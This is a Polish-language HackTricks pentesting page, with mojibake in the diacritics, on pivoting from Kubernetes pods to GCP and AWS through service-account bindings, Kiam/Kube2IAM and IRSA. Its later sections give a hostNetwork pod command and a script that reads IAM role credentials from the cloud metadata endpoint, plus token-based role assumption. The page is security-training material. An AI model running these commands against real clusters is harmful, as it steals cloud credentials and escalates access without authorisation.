# Kubernetes Przechodzenie do Chmur

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## GCP

Jeli uruchamiasz klastra k8s w GCP, prawdopodobnie chcesz, aby niekt贸re aplikacje uruchomione wewntrz klastra miay dostp do GCP. Istniej 2 powszechne sposoby, aby to zrobi:

### Montowanie kluczy GCP-SA jako tajemnicy

Powszechnym sposobem udostpnienia **dostpu do aplikacji Kubernetes do GCP** jest:

* Utw贸rz konto usugi GCP (GCP Service Account)
* Przypisz do niego odpowiednie uprawnienia
* Pobierz klucz JSON utworzonego konta usugi (SA)
* Zamontuj go jako tajemnic wewntrz poda
* Ustaw zmienn rodowiskow GOOGLE\_APPLICATION\_CREDENTIALS wskazujc cie偶k do pliku JSON.

{% hint style="warning" %}
Dlatego jako **atakujcy**, jeli przejmiesz kontener wewntrz poda, powiniene sprawdzi t **zmienn rodowiskow** i **pliki JSON** z danymi uwierzytelniajcymi GCP.
{% endhint %}

### Powizanie pliku JSON GSA z tajemnic KSA

Spos贸b udostpnienia dostpu do GSA w klastrze GKE polega na powizaniu ich w nastpujcy spos贸b:

* Utw贸rz konto usugi Kubernetes (Kubernetes service account) w tej samej przestrzeni nazw co tw贸j klaster GKE, u偶ywajc nastpujcej komendy:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Utw贸rz tajemnic Kubernetes, kt贸ra zawiera dane uwierzytelniajce konta usugi GCP, do kt贸rego chcesz udzieli dostpu do klastra GKE. Mo偶esz to zrobi za pomoc narzdzia wiersza polece `gcloud`, jak pokazano w poni偶szym przykadzie:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Przypisz tajemnic Kubernetes do konta usugi Kubernetes za pomoc nastpujcego polecenia:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
W **drugim kroku** ustawiono **powiadczenia GSA jako tajemnica KSA**. Jeli mo偶esz **odczyta t tajemnic** z **wntrza** klastra **GKE**, mo偶esz **przej do tego konta usugi GCP**.
{% endhint %}

### To偶samo obci偶eniowa GKE

Dziki to偶samoci obci偶eniowej mo偶emy skonfigurowa[ konto usugi Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) tak, aby dziaao jako[ konto usugi Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Pojedyncze konta uruchomione z kontem usugi Kubernetes automatycznie uwierzytelniaj si jako konto usugi Google podczas dostpu do interfejs贸w API Google Cloud.

**Pierwsza seria krok贸w** do wczenia tego zachowania to **wczenie to偶samoci obci偶eniowej w GCP** ([**kroki**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) i utworzenie konta usugi GCP, kt贸re chcesz, aby k8s udawa.

* **Wcz to偶samo obci偶eniow** w nowym klastrze

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Utw贸rz/aktualizuj nowy nodepool** (Klastry Autopilot nie wymagaj tego)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Utw贸rz **Konto usugi GCP do udawania** z K8s z uprawnieniami GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Pocz** si z **klastrzem** i **utw贸rz** konto **usugi**, kt贸re zostanie u偶yte

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Pocz GSA z KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Uruchom **pod** z **KSA** i sprawd藕 **dostp** do **GSA**:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Sprawd藕 poni偶sz komend, aby uwierzytelni si w razie potrzeby:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Jako atakujcy wewntrz K8s powiniene **szuka SA** z adnotacj **`iam.gke.io/gcp-service-account`**, poniewa偶 wskazuje to, 偶e SA ma dostp do czego w GCP. Inn opcj jest pr贸ba wykorzystania ka偶dego KSA w klastrze i sprawdzenie, czy ma dostp.\
Zawsze interesujce jest wyliczenie powiza z GCP i dowiedzenie si, **jakie uprawnienia przypisujesz SA wewntrz Kubernetes**.
{% endhint %}

Oto skrypt, kt贸ry umo偶liwia **iteracj po definicjach wszystkich pod贸w** w celu **wyszukania tej adnotacji**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role dla Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Przestarzay spos贸b na przypisanie r贸l IAM do Pods polega na u偶yciu serwera [**Kiam**](https://github.com/uswitch/kiam) lub [**Kube2IAM**](https://github.com/jtblin/kube2iam). Og贸lnie rzecz biorc, musisz uruchomi **daemonset** w klastrze z rodzajem uprzywilejowanej roli IAM. Ten daemonset bdzie odpowiedzialny za udostpnianie dostpu do r贸l IAM dla potrzebujcych tego pod贸w.

Przede wszystkim musisz skonfigurowa **jakie role mog by dostpne wewntrz przestrzeni nazw**, a robisz to za pomoc adnotacji w obiekcie przestrzeni nazw:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Po skonfigurowaniu przestrzeni nazw z rolami IAM, kt贸re mog mie pody, **mo偶esz wskaza rol, kt贸r chcesz przypisa do ka偶dej definicji poda, u偶ywajc czego takiego jak**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Jako atakujcy, jeli **znajdziesz te adnotacje** w podach lub przestrzeniach nazw lub dziaajcym serwerze kiam/kube2iam (prawdopodobnie w kube-system), mo偶esz **udawa ka偶d rol**, kt贸ra jest ju偶 **u偶ywana przez pod** i wicej (jeli masz dostp do konta AWS, wyliczaj role).
{% endhint %}

#### Utw贸rz Pod z rol IAM

{% hint style="info" %}
Rola IAM, kt贸r nale偶y wskaza, musi znajdowa si w tym samym koncie AWS co rola kiam/kube2iam i ta rola musi mie do niej dostp.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role dla kont usug K8s za pomoc OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

To jest **zalecany spos贸b przez AWS**.

1. Przede wszystkim musisz [utworzy dostawc OIDC dla klastra](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Nastpnie tworzysz rol IAM z uprawnieniami, kt贸re bd wymagane przez konta usug.
3. Tworzysz [relacj zaufania midzy rol IAM a kontem usugi](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) o nazwie (lub przestrzeniach nazw, kt贸re daj dostp do roli wszystkim kontom usug w przestrzeni nazw). _Relacja zaufania bdzie g贸wnie sprawdza nazw dostawcy OIDC, nazw przestrzeni nazw i nazw konta usugi_.
4. Na koniec, **tworzysz konto usugi z adnotacj wskazujc ARN roli**, a pojemniki uruchamiane z tym kontem usugi bd miay **dostp do tokenu roli**. **Token** jest **zapisywany** w pliku, a cie偶ka jest okrelona w **`AWS_WEB_IDENTITY_TOKEN_FILE`** (domylnie: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Aby **uzyska dostp do aws za pomoc tokena** z `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, wykonaj nastpujce polecenie:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Jako atakujcy, jeli mo偶esz wyliczy klastra K8s, sprawd藕 **konta usug z t adnotacj**, aby **przej do AWS**. Aby to zrobi, po prostu **wykonaj/utw贸rz** pod u偶ywajc jednego z uprzywilejowanych kont usug IAM i kradnij token.

Ponadto, jeli jeste wewntrz poda, sprawd藕 zmienne rodowiskowe takie jak **AWS\_ROLE\_ARN** i **AWS\_WEB\_IDENTITY\_TOKEN**.
{% endhint %}

{% hint style="danger" %}
Czasami **polityka zaufania roli** mo偶e by **藕le skonfigurowana** i zamiast udziela dostpu do AssumeRole oczekiwanemu kontu usugi, udziela go **wszystkim kontom usug**. Dlatego, jeli jeste w stanie napisa adnotacj na kontrolowanym koncie usugi, mo偶esz uzyska dostp do roli.

Sprawd藕 **nastpujc stron po wicej informacji**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Znajd藕 Pody i konta usug z rolami IAM w klastrze

To jest skrypt, kt贸ry **iteruje po wszystkich podach i definicjach kont usug**, **szukajc** tej **adnotacji**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Rola IAM wza

Poprzedni rozdzia dotyczy kradzie偶y r贸l IAM z pod贸w, ale nale偶y zauwa偶y, 偶e **wze klastra K8s jest instancj w chmurze**. Oznacza to, 偶e wze prawdopodobnie bdzie **posiada now rol IAM, kt贸r mo偶na ukra** (_nale偶y jednak zauwa偶y, 偶e zazwyczaj wszystkie wzy klastra K8s bd miay t sam rol IAM, wic mo偶e nie warto sprawdza ka偶dego wza_).

Jednak istnieje wa偶ne wymaganie dotyczce dostpu do punktu kocowego metadanych z wza - musisz by na w藕le (sesja SSH?) lub przynajmniej mie tak sam sie:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Kradnij token roli IAM

Wczeniej om贸wilimy, jak **doczy role IAM do Pod贸w** lub nawet jak **uciec do Node, aby ukra rol IAM**, kt贸r instancja ma doczon.

Mo偶esz u偶y poni偶szego skryptu, aby **ukra** nowo zdobyte **powiadczenia roli IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Odwoania

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
